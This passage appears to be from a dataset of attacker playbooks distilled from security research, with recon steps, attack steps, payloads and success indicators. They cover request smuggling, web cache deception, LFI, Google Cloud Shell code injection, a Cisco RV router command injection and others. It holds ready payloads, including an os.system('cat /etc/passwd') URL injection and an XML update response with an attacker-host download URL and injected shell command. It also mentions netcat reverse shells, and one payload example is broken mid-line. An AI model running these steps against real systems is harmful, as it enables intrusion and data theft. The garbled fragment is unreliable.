Observation of sub-apps attempting to access APIs that require authentication or specific permissions.
skip_if: Super-app does not use WebViews for sub-app functionality.
Sub-apps are completely sandboxed and cannot access any privileged APIs.

recon_steps: Step 1: Identify mobile applications that function as 'super-apps' and host 'sub-apps' within WebViews.
Step 2: Analyze the communication between the super-app and its sub-apps to understand how privileged APIs are accessed.
attack_steps: Step 1: Identify the identity checks used by the super-app for privileged API access (web domains, sub-app IDs, capabilities).
Step 2: Attempt to confuse these identity checks by manipulating the context or origin of the sub-app's request.
Step 3: If identity checks are flawed, an attacker can gain unauthorized access to privileged APIs, leading to potential manipulation of user data or system functions.
tools_recommended: Mobile security analysis tools (e.g., Frida, MobSF) to intercept and analyze network traffic and API calls.
Reverse engineering tools to understand the app's internal logic.
success_indicators: Unauthorized access to privileged APIs.
Manipulation of user financial accounts.
Installation of malware on the smartphone.
failure_indicators: API calls are consistently rejected with authorization errors.
No observable difference in behavior when attempting to confuse identity checks.

playbooks.impact: Manipulation of users' financial accounts, installation of malware on a smartphone, unauthorized access to privileged APIs.
playbooks.key_lesson: Thoroughly analyze identity checks for privileged API access in WebView-based mobile app ecosystems, as they can be susceptible to 'identity confusion' vulnerabilities.

meta.title: Mining Node.js Vulnerabilities via Object Dependence Graph and Query
meta.authors: Song Li, Mingqing Kang, Jianwei Hou, Yinzhi Cao
meta.category: RCE, OS command injection, Prototype pollution, Path traversal

trigger_conditions.when_to_apply: This technique applies when analyzing Node.js source code to detect known vulnerability types like command injection, prototype pollution, and path traversal by constructing an Object Dependence Graph (ODG).
prerequisites: Access to Node.js source code.
applicability_signals: The target system is built using Node.js.
skip_if: The target system does not use Node.js.

recon_steps: Step 1: Obtain the source code of the Node.js application.
Step 2: Analyze the code to understand its structure and identify dependencies.
attack_steps: Step 1: Use an abstract interpretation engine to generate an Object Dependence Graph (ODG) from the Node.js source code.
Step 2: Augment the ODG with Abstract Syntax Tree (AST) and Control Flow Graph (CFG) information.
Step 3: Define and execute graph queries on the ODG to detect specific vulnerability patterns, focusing on object lookups and definitions.
Step 4: Analyze the query results to identify potential vulnerabilities such as command injection, prototype pollution, and path traversal.
payloads_or_patterns: Insufficient detail in writeup. This playbook describes a static analysis technique rather than direct payload delivery.
tools_recommended: ODGEN (open-source prototype system for generating ODG and detecting vulnerabilities)
success_indicators: Identification of vulnerable code paths through graph queries.
Reporting of detected vulnerabilities with specific patterns (e.g., unsanitized user input leading to command execution).
failure_indicators: No significant vulnerability patterns detected after graph analysis. The ODG construction or query might not be specific enough for a particular vulnerability type not modeled.
False positives generated by the analysis that require manual verification.

playbooks.impact: Detection of zero-day vulnerabilities in Node.js applications, potentially leading to Remote Code Execution (RCE), OS command injection, prototype pollution, or path traversal, allowing attackers to compromise the server, steal data, or disrupt services.
playbooks.key_lesson: Static analysis of Node.js code using Object Dependence Graphs (ODG) combined with AST and CFG can effectively detect a wide range of vulnerabilities by modeling object relationships and query patterns.

meta.title: Web Cache Deception Escalates!
meta.authors: Seyed Ali Mirheidari, Matteo Golinelli, Kaan Onarlioglu, Engin Kirda, Bruno Crispo

affected_components: Any web page accessible via HTTP/S
tech_stack_fingerprints: Presence of Cache-Control, Expires, or other HTTP cache-related headers in responses

trigger_conditions.when_to_apply: When a website utilizes caching mechanisms and the attacker can influence how cached content is generated or served, potentially leading to the caching of sensitive or unintended content. This is particularly relevant when dealing with authenticated sections that might be inadvertently exposed or when attacking non-authenticated pages.
prerequisites: The target must use a web cache (e.g., browser cache, CDN, reverse proxy cache).
The attacker needs a way to send requests that might influence the cache's behavior.
applicability_signals: Observation of cache-related HTTP headers (e.g., `Cache-Control`, `Expires`, `Vary`).
Websites with complex routing or content negotiation that might lead to cache confusion.
skip_if: Websites that explicitly disable caching for all content (e.g., `Cache-Control: no-store`).
WAF rules that aggressively block requests with unusual patterns often used in cache poisoning attempts.

recon_steps: Step 1: Identify potential caching behavior by observing `Cache-Control`, `Expires`, `Age`, and `Vary` headers in responses from various endpoints.

Step 2: Analyze website structure to identify areas where unauthenticated users might indirectly influence cached content, especially when authenticated content is involved or when specific request patterns could lead to unintended caching.
attack_steps: Step 1: Craft a request that aims to poison the cache. This often involves sending a request to an endpoint that is normally protected or that returns different content based on certain headers (e.g., `Accept-Language`, `User-Agent`, `Cookie`).

Step 2: Introduce a malicious payload or marker within the request that, when processed by the origin server, leads to it generating a response that the cache mistakenly associates with a more general cache key.

Step 3: Send a subsequent, unauthenticated request to the same or a related URL, expecting to receive the poisoned cache entry that contains unintended sensitive information or redirects to a malicious site.
Step 4: Repeat with variations of headers, cookies, and request parameters to test different caching scenarios and potential injection points.
payloads_or_patterns: Requests designed to exploit specific cache behaviors, e.g., injecting a unique string in a `Cookie` header and then requesting a resource that uses that `Cookie` value to return authenticated data, but the cache stores it under a generic key.
Utilizing techniques described in the paper for marker injection and reflection, or using page identity checks and cache header heuristics for broader detection.
tools_recommended: Burp Suite: For crafting and sending various HTTP requests, manipulating headers, and observing responses.
Custom scripts (Python, Go): To automate the process of sending numerous requests and analyzing cache headers and response content.
success_indicators: Receiving sensitive information (e.g., PII, session tokens, internal data) in the response to an unauthenticated request.
Observing a response that differs from what an unauthenticated user should normally receive for the requested URL.
Successful redirection to a malicious URL for an otherwise legitimate-looking request.
failure_indicators: Receiving the expected unauthenticated content consistently, indicating the cache is not being poisoned.
Receiving `404 Not Found` or `403 Forbidden` errors for crafted requests, suggesting the server or WAF is blocking the attack attempts.
Cache headers showing that the response is not being cached or is being cached with a specific key that prevents unauthorized access.

playbooks.impact: Disclosure of sensitive information accessible to unauthenticated users, potentially including personally identifiable information (PII), session tokens, internal application data, or unauthorized access to resources by tricking the cache into serving content intended for authenticated users.
playbooks.key_lesson: Always investigate web caching mechanisms as they can inadvertently lead to the exposure of sensitive data or unauthorized access, especially when dealing with authentication boundaries or specific header-based content variations.

meta.title: Advanced Inter-Process Desynchronization in SAP’s HTTP Server

trigger_conditions.when_to_apply: When an attacker can send crafted HTTP requests to a target system that uses SAP's HTTP Server, and the server is susceptible to HTTP request smuggling vulnerabilities due to desynchronization between the front-end and back-end parsers.
prerequisites: Attacker has network access to the target SAP HTTP server.
applicability_signals: The target server responds with SAP-related headers (e.g., 'Server: SAP', 'X-Powered-By: SAP').
Observing abnormal request/response behavior when sending specific HTTP headers like `Transfer-Encoding` or `Content-Length` in conflicting ways.
skip_if: The server correctly processes HTTP requests with conflicting `Transfer-Encoding` and `Content-Length` headers without desynchronization.
A Web Application Firewall (WAF) blocks or sanitizes requests containing the specific headers required for smuggling.

recon_steps: Step 1: Identify target systems running SAP and determine if they expose an HTTP interface.
Step 2: Send unauthenticated requests to the target SAP HTTP server and analyze HTTP response headers for SAP-specific indicators (e.g., 'Server: SAP', 'X-Powered-By: SAP').
attack_steps: Step 1: Craft a request with a 'Transfer-Encoding: chunked' header and a 'Content-Length' header with a different value. The 'Transfer-Encoding' should be specified first.
Step 2: Immediately follow the first request with a second, benign request (e.g., a GET request for a common resource).

Step 3: Observe the response to the second request. If the server misinterprets the boundaries of the first request, it may prepend or append data from the second request to the first, leading to unexpected responses or behavior for the second request.
Step 4: If initial attempts fail, experiment with different combinations and orderings of `Transfer-Encoding` and `Content-Length` headers, as well as varying the payload sizes and content.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL>
Transfer-Encoding: chunked
Content-Length: 4

5
12345
0

GET /some/path HTTP/1.1
Host: <TARGET_URL>
tools_recommended: Burp Suite: To craft and send custom HTTP requests with specific header manipulations.
Custom Python scripts: For automating the sending of request pairs and analyzing responses.
success_indicators: The response to the second, benign request contains data or exhibits behavior that should only be associated with the first, smuggled request.
Receiving an unexpected status code or response body for the second request.
The server returns unexpected content, such as sensitive data that was intended to be part of the smuggled request.
failure_indicators: Both requests are processed independently and in the correct order, with no anomalous behavior observed in the second request's response. Suggestion: Try alternative HTTP smuggling techniques or look for other vulnerabilities.
The server returns a 400 Bad Request for the malformed request. Suggestion: Adjust header values or order.

playbooks.impact: Remote Code Execution (RCE) is possible by smuggling a request that targets an administrative or sensitive endpoint. Data leakage can occur if sensitive information from other requests or internal resources is smuggled into the attacker's response. Session hijacking or authorization bypass can be achieved by smuggling requests that manipulate session cookies or authentication tokens.
playbooks.key_lesson: Always test HTTP request smuggling vulnerabilities on systems that parse HTTP requests, especially those with older or custom HTTP servers, by sending desynchronizing header pairs like `Transfer-Encoding` and `Content-Length`.

meta.title: Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling
meta.programs: AWS, Amazon, Akamai, Cisco, Verisign, Pulse Secure, Varnish

target_profile.technology: Web applications with reverse proxy front-ends, single-server websites, internal networks, Apache, Akamai, Varnish, Amazon.com, AWS Application Load Balancer, Web VPNs
tech_stack_fingerprints: Presence of a reverse proxy (e.g., Cloudflare, Akamai, AWS ALB, Varnish)
Vulnerable HTTP request handling (e.g., differing CL.TE / TE.CL behavior)

trigger_conditions.when_to_apply: This technique is applicable to any web application that utilizes a reverse proxy front-end, or exhibits HTTP request handling anomalies that can be exploited via a web browser. It specifically targets scenarios where a victim's browser can be manipulated to send malformed HTTP requests that cause desynchronization between the proxy and the backend server.
prerequisites: The target must have a front-end proxy that processes HTTP requests before forwarding them to a backend server.
The proxy and backend server must exhibit differing interpretations of HTTP request boundaries (e.g., via CL.TE or TE.CL vulnerabilities).
The attacker must be able to trick the victim's browser into making a cross-domain request to the vulnerable target.
applicability_signals: Observed desync behavior with standard HTTP smuggling techniques.
Target uses technologies known to be susceptible to HTTP request smuggling (e.g., specific proxy configurations).
Ability to trigger cross-domain requests from a victim's browser to the target.
skip_if: The target strictly adheres to HTTP/2 or HTTP/3, which are more resistant to traditional request smuggling.
All HTTP requests are meticulously validated and sanitized by the proxy, preventing any form of desync.
No cross-domain requests can be initiated from a victim's browser to the target application.

recon_steps: Step 1: Fingerprint the target's HTTP request handling for desync vulnerabilities using standard CL.TE and TE.CL techniques with tools like Burp Suite's HTTP Request Smuggler.
Step 2: Identify endpoints that allow cross-domain requests from a victim's browser (e.g., through CORS misconfigurations or JavaScript's `fetch` API).
Step 3: Analyze the target's response to malformed requests to identify potential desync gadgets and connection pool poisoning opportunities.
attack_steps: Step 1: Craft a malicious web page (e.g., an HTML file or a server-side script controlled by the attacker) that embeds a cross-domain request to the target application.

Step 2: The embedded request will contain a carefully crafted HTTP request smuggling payload. This payload aims to poison the browser's connection pool or send a desynced request to the backend server.
Step 3: When a victim visits the attacker's malicious page, their browser initiates the cross-domain request, triggering the desync attack on the target.

Step 4: Depending on the desync gadget, this could lead to subsequent requests from the victim (or other users) being intercepted or modified by the proxy, effectively smuggling malicious requests to the backend.
payloads_or_patterns: Example: A crafted JavaScript `fetch` request that includes a `Content-Length` and a `Transfer-Encoding: chunked` header, designed to confuse the proxy and backend.
Example: A malicious `` tag or `

Template for a malicious request smuggled via a victim's browser: `GET / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 10

POST /malicious_endpoint HTTP/1.1
Host: <TARGET_URL>
Content-Length: 5

AAAAA` (This is a simplified example, actual payloads are more complex and target specific vulnerabilities).
tools_recommended: Burp Suite Professional: For identifying desync vulnerabilities, crafting payloads, and analyzing responses.
Custom JavaScript/HTML: To host the malicious web page that victim's browser will visit.
Burp Collaborator: To detect out-of-band interactions resulting from successful desync attacks.
success_indicators: Receiving an unexpected response from the target server that corresponds to a smuggled request, even though the victim's browser did not explicitly send it.
Observing callback requests to Burp Collaborator originating from the target's backend server when no direct outbound connection should be possible.
Successful execution of arbitrary commands on the backend server or unauthorized data exfiltration.
failure_indicators: No desync behavior observed, all requests processed as expected.
Target's firewall or WAF blocks the smuggled request.
Victim's browser or proxy handles the malformed request without desync (e.g., returns a 400 Bad Request).

playbooks.impact: Attacker can leverage a victim's browser to trigger HTTP request smuggling, leading to potential compromise of single-server websites and internal networks. This can enable installing backdoors, poisoning connection pools, enabling client-side and server-side desync exploits, and potentially executing arbitrary code or exfiltrating sensitive data.
playbooks.key_lesson: Always consider the potential for HTTP request smuggling when dealing with web applications that employ front-end proxies, and investigate the possibility of leveraging client-side browser features to initiate desync attacks against otherwise inaccessible backends.

meta.title: How I earned a $6000 bug bounty from Cloudflare

trigger_conditions.when_to_apply: When a subdomain of Cloudflare is found and it potentially serves content that can be manipulated via path traversal.
prerequisites: Discovery of subdomains associated with Cloudflare.
applicability_signals: The presence of the https://sub.cloudflare.com/ domain.
Tools like 'subton' are used to discover subdomains.
skip_if: The target domain does not appear to be vulnerable to path traversal or LFI after initial scanning.

recon_steps: Step 1: Use 'subton' tool to enumerate subdomains of the target (e.g., 'Telegram — BOT' /subton domain.com).
Step 2: Save the output of subdomain enumeration to a file (e.g., /usr/share/sub/output.txt).
Step 3: Use 'waybackurls' to collect historical URLs associated with the target domain.
Step 4: Save the output of waybackurls to a file (e.g., /usr/share/dir/domain_target.txt).
attack_steps: Step 1: Configure exploit assets/exploits.json in ApachSAL to include relevant LFI payloads.
Step 2: Run ApachSAL against the target domain using the collected subdomains and historical URLs.
Step 3: Analyze the output of ApachSAL for potential LFI vulnerabilities.
tools_recommended: subton: for subdomain enumeration
waybackurls: for collecting historical URLs
ApachSAL: for LFI exploitation
Burp Suite Intruder: for manual fuzzing of parameters if automated tools fail
success_indicators: Successful retrieval of sensitive files such as /etc/passwd.
The tool ApachSAL reports a successful LFI exploit.
failure_indicators: ApachSAL does not report any LFI vulnerabilities. (Suggest trying other LFI vectors or tools.)
No sensitive files are retrieved. (Suggest focusing on other vulnerabilities.)

playbooks.impact: Remote attackers can read arbitrary files on the server, potentially leading to the disclosure of sensitive information such as configuration files, source code, or user data. In cases where PHP code execution is also possible through LFI, this could lead to full server compromise.
playbooks.key_lesson: Always test for Local File Inclusion (LFI) vulnerabilities, especially on subdomains or less scrutinized parts of an application, as they can lead to significant data exposure and potential server compromise.

meta.title: Google Cloud Shell - Command Injection

trigger_conditions.when_to_apply: When the target application directly embeds user-controlled input from a URL parameter into an executable context (e.g., a Python script) without proper sanitization or encoding.
prerequisites: Ability to interact with Google Cloud Shell via its web interface.
applicability_signals: Discovery of the `project` parameter in the Cloud Shell URL.
Discovery of the `show` parameter, specifically `show=ide` which reveals a different terminal interface.
Observing that user input in the `project` parameter is directly included in a Python script executed within the terminal.
skip_if: If user input is properly sanitized or encoded before being embedded in executable code.
If all attempts to inject code result in syntax errors or direct rejection without execution.

recon_steps: Step 1: Access the Google Cloud Shell web interface: https://shell.cloud.google.com/
Step 2: Observe the default URL parameters and their effects on the Cloud Shell environment (e.g., `project`, `show`).
Step 3: Experiment with changing the `show` parameter to `show=ide` to access a different terminal view.
Step 4: Attempt to inject special characters like `'` into the `project` parameter and observe the terminal output for errors indicating direct code inclusion.
attack_steps: Step 1: Craft a URL with the `project` parameter to first fix the Python syntax. An example payload is `asd':print(''`. Navigate to `https://shell.cloud.google.com/?show=ide&project=<PAYLOAD>`.
Step 2: Observe that the syntax error is resolved, indicating successful injection into the Python script.

Step 3: Modify the `project` parameter to include a Python command for command execution, such as `asd':import os;os.system("cat /etc/passwd");print(''`. Navigate to `https://shell.cloud.google.com/?show=ide&project=<PAYLOAD>`.
Step 4: Observe the terminal output for the result of the executed command (e.g., the content of `/etc/passwd`).
tools_recommended: Browser: For navigating to the target URL and observing responses.
Burp Suite (or similar proxy): To intercept and modify the URL parameters.
success_indicators: The terminal successfully executes Python code injected via the `project` parameter.
The output of commands like `cat /etc/passwd` is displayed in the Cloud Shell terminal.
failure_indicators: Persistent syntax errors regardless of payload modifications suggest insufficient injection flexibility.
403 Forbidden or other access denied errors indicate potential WAF or security controls blocking the injection.

playbooks.impact: Remote code execution within the Google Cloud Shell environment, allowing an attacker to access sensitive files (e.g., `/etc/passwd`), execute arbitrary commands, and potentially gain further access to the user's cloud resources.
playbooks.key_lesson: Always sanitize and properly encode user-controlled input before embedding it into executable code or scripts, even if the input originates from URL parameters.

meta.title: iOS Privacy: Instagram and Facebook can track anything you do on any website in their in-app browser

tech_stack_fingerprints: Handles external links by opening within the app instead of default browser

trigger_conditions.when_to_apply: When the target application uses an in-app browser to render third-party links or advertisements, as opposed to using the device's default browser.
prerequisites: Target application must open external links within its own in-app browser.
Target application must be able to inject custom JavaScript into the loaded web pages.
applicability_signals: User clicks on an external link or ad within the app.
The link opens in a view that is part of the application, not the system's default browser.
The application's privacy policy or terms of service mention data collection from linked sites.
skip_if: The application always uses the system's default browser (e.g., Safari) for external links.
The application explicitly states that no JavaScript is injected into third-party sites.

recon_steps: Step 1: Identify if the target iOS application uses an in-app browser by clicking on various external links (e.g., news articles, advertisements, social media posts).
Step 2: Observe whether the link opens within the application's UI or redirects to the system's default browser (e.g., Safari).
Step 3: (If using developer tools or jailbroken device) Attempt to inspect the network requests or DOM of the loaded page within the in-app browser to look for injected scripts or modified content.
attack_steps: Step 1: Trigger the in-app browser by navigating to a known third-party website (e.g., a simple HTML page you control).
Step 2: Confirm that custom JavaScript is being injected into the loaded third-party page by observing console logs or DOM modifications.
Step 3: (If applicable) Analyze the injected JavaScript or any associated network requests to understand what data is being captured (e.g., form inputs, keystrokes, user interactions).
payloads_or_patterns: N/A - This is a privacy violation due to injected code, not a specific payload exploit.
Example of a potential injected script's behavior (not an actual payload): `document.addEventListener('copy', event => console.log('Copy event:', event.target.value));`
Example of potential data capture: Capturing all input field values from forms on the third-party website.
tools_recommended: Browser developer tools (if the in-app browser can be debugged)
Network monitoring tools (e.g., Wireshark, mitmproxy) on a jailbroken device or emulator to inspect traffic
Custom-built, simple HTML pages to serve as test targets for the in-app browser.
success_indicators: Observing custom JavaScript execute on a third-party website loaded within the in-app browser.
Evidence of data being sent from the third-party website back to the host application's servers.
Detection of event listeners for user interactions (e.g., 'click', 'copy', 'input') on elements within the third-party page.
failure_indicators: External links consistently open in the system's default browser.
No signs of custom JavaScript execution on third-party pages loaded in the in-app browser.
Network traffic analysis shows no unusual data being sent from the third-party page to the application.

playbooks.impact: The host application (Instagram/Facebook) can track all user interactions on any third-party website visited through its in-app browser. This includes form inputs (passwords, credit card numbers, addresses), text selections, clicks, and potentially screenshots, bypassing user consent and Apple's App Tracking Transparency.
playbooks.key_lesson: When applications utilize custom in-app browsers, they gain the ability to inject JavaScript into third-party websites, potentially allowing for extensive user tracking and data exfiltration that bypasses standard browser privacy controls.

meta.title: The quantum state of Linux kernel garbage collection CVE-2021-0920 (Part I)

trigger_conditions.when_to_apply: This vulnerability is applicable when a Linux kernel is using the SCM_RIGHTS mechanism to pass file descriptors between processes and has an ephemeral race condition in its garbage collection for these file descriptors.
prerequisites: Target system is running a vulnerable version of the Linux kernel (e.g., 4.14).
The SCM_RIGHTS mechanism is being used.
The attacker can trigger a race condition in the garbage collection process.
applicability_signals: Presence of SCM_RIGHTS functionality in the kernel source.
Observed race conditions during file descriptor transmission.
skip_if: Kernel version is patched against CVE-2021-0920.
SCM_RIGHTS is not implemented or used.

recon_steps: Step 1: Identify the Linux kernel version running on the target system.
Step 2: Review kernel source code or security advisories for the presence of CVE-2021-0920 and its associated SCM_RIGHTS garbage collection mechanism.
attack_steps: Step 1: Craft a process that utilizes the `sendmsg` syscall with SCM_RIGHTS to send a file descriptor.
Step 2: Simultaneously trigger the garbage collection process in a way that creates a race condition, aiming to cause a use-after-free on the `sk_buff` object.
Step 3: Develop exploit code to leverage the use-after-free for arbitrary read/write primitives and privilege escalation.
payloads_or_patterns: Insufficient detail in writeup. Specific exploit code targeting the race condition and sk_buff UAF is required.
tools_recommended: Kernel debugging tools (e.g., kgdb, SystemTap)
Fuzzing frameworks for kernel exploit development
Static analysis tools for identifying race conditions in kernel code
success_indicators: Arbitrary read/write primitives achieved.
Successful privilege escalation to root.
Bypassing kernel security mitigations like CONFIG_ARM64_UAO and Samsung RKP.
failure_indicators: Kernel panic without achieving intended primitives (indicates incorrect race condition triggering).

No observable memory corruption or privilege escalation (indicates successful mitigation or incorrect exploit logic). Suggestion: Analyze kernel memory dumps to identify the exact point of failure and refine the race condition timing.

playbooks.impact: Attain arbitrary read/write capabilities within the kernel, bypass security mitigations, and achieve full root privilege escalation on the target system.
playbooks.key_lesson: Carefully analyze kernel garbage collection mechanisms for race conditions, especially when dealing with reference-counted objects like file descriptors passed via SCM_RIGHTS.

meta.title: Security Implications of URL Parsing Differentials

affected_components: URL parsing logic within web applications

trigger_conditions.when_to_apply: When a web application parses user-supplied URLs and uses them in redirects or subsequent requests, especially if different URL parsers are used internally or by downstream components.
prerequisites: The target application accepts user-controlled URLs as input for redirection or internal processing.
applicability_signals: Endpoints that accept URLs as parameters.
Pages that perform client-side or server-side redirects based on URL parameters.
skip_if: The application strictly validates all URLs against an allowlist.
The application does not perform any redirects or use user-supplied URLs in a way that can be manipulated.

recon_steps: Step 1: Identify all endpoints that accept URL parameters or strings that are likely to be interpreted as URLs.
Step 2: Analyze the behavior of these endpoints when provided with various URL formats, including malformed ones or those with special characters.
attack_steps: Step 1: Craft a URL that exploits potential differences in how the target application's frontend or backend parses it, aiming to redirect to an attacker-controlled domain.
Step 2: For example, an attacker might attempt to use different schemes (e.g., `http` vs `https`), include special characters in unexpected places, or leverage path traversal-like structures.
Step 3: Observe the redirection behavior. If the application uses a different parsing mechanism for the redirection than for its own internal processing, an open redirect can occur.
tools_recommended: Burp Suite (Repeater/Intruder for testing variations)
Custom scripts for automating URL parsing tests
success_indicators: HTTP 3xx redirection response to an attacker-controlled domain.
Execution of JavaScript code (e.g., via `javascript:` URI) in the user's browser.
failure_indicators: Consistent 4xx or 5xx errors indicating malformed input.
Redirection to the intended domain, not the attacker's.
WAF blocking suspicious URL patterns.

playbooks.impact: An attacker can redirect users to arbitrary external websites, potentially for phishing, credential harvesting, or delivering malicious payloads.
playbooks.key_lesson: Test URL parsing logic for differentials between frontend/backend and different parser implementations; always validate user-supplied URLs strictly against an allowlist or expected format before redirection.

meta.title: Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability

trigger_conditions.when_to_apply: When the Cisco RV Series Routers (RV160, RV260, RV340, RV345) are running vulnerable firmware versions and are reachable by an attacker.
prerequisites: The router must be accessible over the network.
The vulnerable firmware versions must be in use.
applicability_signals: The presence of the `wfapp` binary.
The router performing POST requests to `bcap15.brightcloud.com` for database updates.
The router performing GET requests to `database.brightcloud.com` for database downloads.
skip_if: The router is running a patched firmware version.
Network access to `bcap15.brightcloud.com` or `database.brightcloud.com` is blocked.

recon_steps: Step 1: Identify Cisco RV160, RV260, RV340, or RV345 series routers on the network.
Step 2: Determine the firmware version of the identified routers by accessing their web interface or through network scanning.
Step 3: Verify if the firmware version falls within the vulnerable range (RV160/RV260: 1.0.01.05 to 1.0.01.08; RV340/RV345: 1.0.03.26 to 1.0.03.27).
attack_steps: Step 1: Craft a malicious POST request to `bcap15.brightcloud.com` that mimics the legitimate database update check. This request should manipulate the `method` parameter to trigger command execution when the response is processed.

Step 2: The router will then attempt to download a file from `database.brightcloud.com` based on the malicious response. This download process is where the command injection occurs, as the filename or other parameters can be controlled to include shell commands.
Step 3: Observe network traffic for outgoing connections from the router to attacker-controlled infrastructure (e.g., for reverse shells or command output).
payloads_or_patterns:
POST / HTTP/1.1
Content-Type: text/html
Host: bcap15.brightcloud.com
Content-Length: <length>
Connection: close

<?BrightCloud version=bcap/1.1?>
<bcap>
<seqnum>1</seqnum>
<encrypt-type>none</encrypt-type>
<request>
<method>getmd5update1mrep</method>
<uid>PSZ25281CDE</uid>
<productid>RV340-WB</productid>
<oemid>Cisco</oemid>
<md5currentmajor>0</md5currentmajor>
<md5currentminor>0</md5currentminor>
<downloadurl>http://attacker-controlled-server.com/malicious_file.bin; whoami > /tmp/cmd_output.txt</downloadurl>
</request>
</bcap>
tools_recommended: Burp Suite: To intercept and modify HTTP requests and responses, especially the POST request to `bcap15.brightcloud.com`.
Netcat or similar for establishing reverse shells or exfiltrating command output.
A local web server to host the malicious file for download.
success_indicators: Receipt of a reverse shell connection from the target router to the attacker's IP address.
Discovery of command output files (e.g., `/tmp/cmd_output.txt`) on the router containing expected command results (e.g., `root`, `admin`).
The router attempting to download a file from an attacker-controlled server when it should be downloading from `database.brightcloud.com`.
failure_indicators: Router continues to download from `database.brightcloud.com` without executing injected commands.
No reverse shell connection is established, and no command output files are found on the router.
POST requests to `bcap15.brightcloud.com` are blocked or return an error other than a 200 OK status with XML content.

playbooks.impact: Unauthenticated Remote Command Execution (RCE) on affected Cisco RV series routers. This could allow an attacker to gain full control of the device, modify its configuration, intercept network traffic, or use it as a pivot point to attack other systems on the network.
playbooks.key_lesson: When a device fetches updates or configuration files from external sources based on potentially untrusted input or logic, carefully examine how the fetched filename or URL is handled before it's used in a system command or download operation to prevent command injection.

meta.title: From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize Operations Manager

trigger_conditions.when_to_apply: When the target has a dashboard sharing feature that generates public links, and the backend does not properly validate these links before granting access.
prerequisites: An attacker needs to be able to create or obtain a valid dashboard link ID (`t` parameter).
applicability_signals: The existence of a `/contentpack/dashboard_dump/` endpoint (though this is bypassed).
The presence of `com.vmware.vcops.ui.util.MainPortalFilter` in the application code.
The application responds to requests with a `t` parameter.
skip_if: The `t` parameter is not present in any requests.
The `DashboardShareAction.getDashboardPublicLink` method always returns null or throws an error.
The application enforces strict session validation for all `/ui/*` endpoints.

recon_steps: Step 1: Identify if vROps is deployed and accessible via its web UI. Note the version number.
Step 2: Analyze network traffic or application source code (if available) for the presence of dashboard sharing functionality and associated API endpoints or parameters like `t`.
attack_steps: Step 1: Locate or create a shared dashboard link. Obtain the `t` parameter value from the shared link URL (e.g., `https://<TARGET_URL>/ui/dashboardViewer.action?t=<DASHBOARD_LINK_ID>`).

Step 2: Send a request to the `/ui/` endpoint with the `t` parameter.
